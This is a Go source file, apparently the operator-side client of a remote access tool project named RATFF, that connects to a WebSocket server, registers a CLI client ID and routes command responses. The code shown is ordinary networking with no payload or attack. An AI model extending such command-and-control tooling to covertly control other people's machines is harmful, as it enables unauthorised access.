package main

import (
	"encoding/json"

	"RATFF/shared"

	"github.com/gorilla/websocket"
)

// connectWS establishes a WebSocket connection to the server.
func connectWS(wsURL string) (*websocket.Conn, error) {
	conn, _, err := websocket.DefaultDialer.Dial(wsURL, nil)
	if err != nil {
		return nil, err
	}

	clientID := "__cli__" + shared.GenerateID()[:8]
	registerMsg := shared.NewMessage(shared.MsgRegister, "", clientID, nil)
	data, err := json.Marshal(registerMsg)
	if err != nil {
		return nil, err
	}

	if err := conn.WriteMessage(websocket.TextMessage, data); err != nil {
		return nil, err
	}

	return conn, nil
}

// listenResponses reads command responses and routes them to pending commands.
func listenResponses(conn *websocket.Conn) {
	for {
		_, data, err := conn.ReadMessage()
		if err != nil {
			return
		}

		var msg shared.Message
		if err := json.Unmarshal(data, &msg); err != nil {
			continue
		}

		if msg.Type == shared.MsgResponse || msg.Type == shared.MsgError {
			pendingMu.Lock()
			if pc, ok := pendingCmd[msg.ClientID]; ok {
				select {
				case pc.ch <- msg:
				default:
				}
			}
			pendingMu.Unlock()
		}
	}
}
